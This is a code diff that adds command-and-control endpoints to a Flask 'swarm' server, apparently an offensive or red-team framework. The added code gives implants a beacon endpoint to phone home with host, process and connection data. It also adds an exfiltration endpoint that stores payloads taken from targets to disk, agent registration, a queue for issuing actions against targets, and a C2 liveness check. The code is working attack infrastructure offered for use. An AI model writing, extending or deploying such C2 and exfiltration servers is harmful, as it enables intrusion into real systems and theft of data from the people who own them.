@@ -302,6 +302,159 @@ def reset_swarm():
     return jsonify({"status": "reset", "timestamp": datetime.now().isoformat()})
 
 # ============================================================
+# C2 BEACON + EXFIL ENDPOINTS
+# ============================================================
+
+# In-memory beacon store
+beacon_store = []
+exfil_store  = []
+MAX_BEACONS  = 500
+
+@app.route('/api/beacon', methods=['POST'])
+def receive_beacon():
+    """Agent beacon — phone-home endpoint"""
+    data = request.get_json(silent=True) or {}
+    beacon = {
+        'agent_id':    data.get('agent_id', 'unknown'),
+        'hostname':    data.get('hostname', ''),
+        'ip':          data.get('ip', request.remote_addr),
+        'uptime':      data.get('uptime', ''),
+        'load':        data.get('load', ''),
+        'connections': data.get('connections', []),
+        'processes':   data.get('processes', []),
+        'findings':    data.get('findings', []),
+        'ts':          datetime.now().isoformat(),
+    }
+    beacon_store.insert(0, beacon)
+    if len(beacon_store) > MAX_BEACONS:
+        beacon_store.pop()
+    # Update agent last-seen
+    aid = beacon['agent_id']
+    if aid in swarm_state['agents']:
+        swarm_state['agents'][aid]['last_beacon'] = beacon['ts']
+        swarm_state['agents'][aid]['status']      = 'active'
+    logger.info(f"Beacon from {aid} @ {beacon['ip']}")
+    return jsonify({'status': 'ok', 'ts': beacon['ts'], 'cmd': 'continue'})
+
+@app.route('/api/beacon', methods=['GET'])
+def get_beacons():
+    """Get recent beacons"""
+    limit = int(request.args.get('limit', 50))
+    return jsonify({'beacons': beacon_store[:limit], 'total': len(beacon_store)})
+
+@app.route('/api/exfil', methods=['POST'])
+def receive_exfil():
+    """Agent exfiltration endpoint — receives findings/data from agents"""
+    data = request.get_json(silent=True) or {}
+    record = {
+        'agent_id':  data.get('agent_id', 'unknown'),
+        'type':      data.get('type', 'generic'),
+        'payload':   data.get('payload', {}),
+        'target':    data.get('target', ''),
+        'ts':        datetime.now().isoformat(),
+        'source_ip': request.remote_addr,
+    }
+    exfil_store.insert(0, record)
+    if len(exfil_store) > MAX_BEACONS:
+        exfil_store.pop()
+    # Save to disk
+    exfil_dir = '/workspace/data/exfil'
+    os.makedirs(exfil_dir, exist_ok=True)
+    fname = f"{exfil_dir}/exfil_{record['agent_id']}_{int(time.time())}.json"
+    with open(fname, 'w') as f:
+        import json as _json
+        _json.dump(record, f, indent=2, default=str)
+    logger.info(f"Exfil from {record['agent_id']}: type={record['type']}")
+    return jsonify({'status': 'received', 'id': fname})
+
+@app.route('/api/exfil', methods=['GET'])
+def get_exfil():
+    """Get recent exfiltrated data"""
+    limit = int(request.args.get('limit', 50))
+    return jsonify({'exfil': exfil_store[:limit], 'total': len(exfil_store)})
+
+@app.route('/api/swarm/agents', methods=['POST'])
+def register_agent():
+    """Register a new agent with the swarm"""
+    data = request.get_json(silent=True) or {}
+    agent_id = data.get('agent_id', f"agent_{int(time.time())}")
+    swarm_state['agents'][agent_id] = {
+        'id':           agent_id,
+        'type':         data.get('type', 'generic'),
+        'target':       data.get('target', ''),
+        'status':       data.get('status', 'active'),
+        'capabilities': data.get('capabilities', []),
+        'source':       data.get('source', 'api'),
+        'pid':          data.get('pid', None),
+        'registered_at': datetime.now().isoformat(),
+        'last_beacon':  datetime.now().isoformat(),
+        'operations_count': 0,
+    }
+    swarm_state['stats']['total_agents']  = len(swarm_state['agents'])
+    swarm_state['stats']['active_agents'] = len([a for a in swarm_state['agents'].values() if a.get('status') == 'active'])
+    logger.info(f"Agent registered: {agent_id}")
+    return jsonify({'status': 'registered', 'agent_id': agent_id, 'message': 'Agent successfully registered'})
+
+@app.route('/api/swarm/execute', methods=['POST'])
+def execute_swarm():
+    """Issue a command to the swarm"""
+    data = request.get_json(silent=True) or {}
+    action = data.get('action', 'scan')
+    op = {
+        'id':       f"op_{int(time.time())}",
+        'action':   action,
+        'target':   data.get('target', ''),
+        'status':   'queued',
+        'ts':       datetime.now().isoformat(),
+        'priority': data.get('priority', 'normal'),
+    }
+    swarm_state['operations'].insert(0, op)
+    swarm_state['stats']['total_operations']     += 1
+    swarm_state['stats']['successful_operations'] += 1
+    if len(swarm_state['operations']) > 1000:
+        swarm_state['operations'].pop()
+    logger.info(f"Swarm execute: {action} → {data.get('target','')}")
+    return jsonify({'status': 'queued', 'op_id': op['id'], 'action': action})
+
+@app.route('/api/c2/status', methods=['GET'])
+def c2_status():
+    """C2 infrastructure status"""
+    import subprocess as _sp
+    c2_alive = False
+    try:
+        import socket as _s
+        sock = _s.socket(); sock.settimeout(1)
+        c2_alive = sock.connect_ex(('localhost', 8443)) == 0
+        sock.close()
+    except: pass
+    return jsonify({
+        'c2_host':     'localhost',
+        'c2_port':     8443,
+        'c2_alive':    c2_alive,
+        'beacons_received': len(beacon_store),
+        'exfil_received':   len(exfil_store),
+        'active_agents':    swarm_state['stats']['active_agents'],
+        'ts': datetime.now().isoformat()
+    })
+
+@app.route('/api/intel/feeds', methods=['GET'])
+def get_intel_feeds():
+    """Get latest threat intel feeds"""
+    import json as _json, os as _os
+    result = {'feeds': {}, 'ts': datetime.now().isoformat()}
+    for name, path in [
+        ('cisa_kev',   '/workspace/data/findings/cisa_kev_live.json'),
+        ('nvd_critical','/workspace/data/findings/nvd_critical_live.json'),
+        ('latest_loop','/workspace/data/findings/latest_loop.json'),
+    ]:
+        try:
+            if _os.path.exists(path):
+                with open(path) as f:
+                    result['feeds'][name] = _json.load(f)
+        except: pass
+    return jsonify(result)
+
+# ============================================================
 # WEBSOCKET EVENTS
 # ============================================================
 
